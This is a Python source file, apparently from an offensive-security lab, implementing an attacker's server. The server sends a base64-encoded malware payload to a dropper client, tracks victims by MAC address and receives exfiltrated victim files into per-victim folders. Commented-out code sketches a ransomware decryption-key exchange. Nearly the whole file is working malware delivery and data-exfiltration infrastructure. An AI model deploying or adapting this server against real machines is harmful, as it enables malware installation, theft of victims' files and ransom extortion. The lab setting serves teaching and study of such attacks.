#!/usr/bin/env python3

""" Implementation of the server that sends some malicious code to its
    dropper client.
"""

import base64
import logging
import socket
import os
import subprocess
import errno
import time
from getmac import get_mac_address
from cryptography.hazmat.primitives.asymmetric import rsa

class Server:
    """ This class represents a server that stores some malicious payload and sends
    it to the dropper once the connection is established.
    """
   
    FORMAT = 'utf-8'
    IP_ADDR = '192.168.56.110'
    MAX_SIZE = 1024
    VICTIMS = []
    WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
    CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
    TRANSFER_DONE = False

    def __init__(self, port):
        self._port = port
        # Initialize the socket for connection using TCP protocol.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def malicious_code(self):
        """ Malicious payload. In this case just a demonstrative command. """
        return b'print("Hello there hahahaha")'

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        """ Sets the port the server listens to into {new_port}"""
        self._port = new_port

    @property
    def socket(self):
        """ Server socket. """
        return self._socket

    def initialize(self):
        """ Initialize server before the session. """
        try:
            # Binds the server to the port and listens to the port.
            self.socket.bind((Server.IP_ADDR, self._port))
            self.socket.listen()
            logging.debug('Server was successfully initialized.')
        except socket.error:
            print('Server was not initialized due to an error.')

    def make_dir(self, dir_name):
        path = os.path.join(Server.WORKING_DIR, dir_name)
        os.mkdir(path)

    def generate_key_pair(self):
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )

        # Get the public key from the private key
        public_key = private_key.public_key()
    
        return private_key, public_key

    def send_malicious_code(self, conn):
        """ Send malware to the client once the connection is established. """
        file = open(Server.CODE_PATH, "r")
        data = file.read()

        encoded_payload = base64.b64encode('mal.py'.encode())
        conn.sendall(encoded_payload)
        msg = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
        print("[CLIENT] : " + msg)

        #while data:
        #    print(len(data))
        conn.sendall(base64.b64encode(data.encode(Server.FORMAT)))
        #    data = file.read(1024)
        file.close()
        conn.sendall(base64.b64encode("DONE.".encode(Server.FORMAT)))
        msg = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
        print("[CLIENT] : " + msg)

    def receive_victim_files(self, conn, mac):
        path = os.path.join(Server.WORKING_DIR, mac)
        filename = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)

        if "DONE." in str(filename):
            self.TRANSFER_DONE = True
            return
        
        file_loc = os.path.join(path, filename)
        print("[RECV] Receiving the filename.")
        file = open(file_loc, "w")
        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))

        data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
        print("[RECV] Receiving the file data.")
        file.write(data_file)
        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))

        file.close() 

    def attack(self):
        # Establish a connection with the client.
        while True:
            connection, address = self.socket.accept()
            with connection:
                print('Connection with dropper established from {}'.format(address))

                victim_mac = get_mac_address(ip=address[0])

                if victim_mac not in Server.VICTIMS:
                    Server.VICTIMS.append(victim_mac)
                    try:
                        self.make_dir(victim_mac)
                    except OSError as e:
                        if e.errno == errno.EEXIST:
                            print('Directory not created')
                        else:
                            raise


                    #priv, pub = self.generate_key_pair()

                    #self.make_dir('Keys')
                    
                    #command to save the private and public key in /home/attacker/Lab-On-Offensive-Attack/VictimsData

                    #key_name = base64.b64encode('keyname'.encode(SERVER.FORMAT))
                    #connection.sendall(key_name)

                    #key = base64.b64encode('key file'.encode(SERVER.FORMAT))

                    #connection.sendall(key)

                    while not self.TRANSFER_DONE:
                        self.receive_victim_files(connection)
                        if self.TRANSFER_DONE == True:
                            break
                    break
                    
                else:
                    # sends decryption key  
                    """ Opening and reading the private key file. """
                    #file_path = os.path.join(Server.WORKING_DIR, victim_mac)
                    #key_path = os.path.join(file_path, keyname)

                    #priv_key = open(file_path, "r")
                    #data = priv_key.read()

                    """ Sending the filename to the server. """
                    #self._socket.sendall(base64.b64encode(keyname.encode(Ransomware.ENCODING)))
                    #msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
                    #print(f"[CLIENT]: {msg}")

                    """ Sending the file data to the server. """
                    #self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
                    #msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
                    #print(f"[CLIENT]: {msg}")
        
                    """ Closing the file. """
                    #file.close()         


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create and initialize a server running on attacker's side.
    # It takes the port number 27000 (permanent) and will listen to this port.
    server = Server(27000)
    server.initialize()
    # Send a payload to the dropper client once it establishes a connection.
    server.attack()
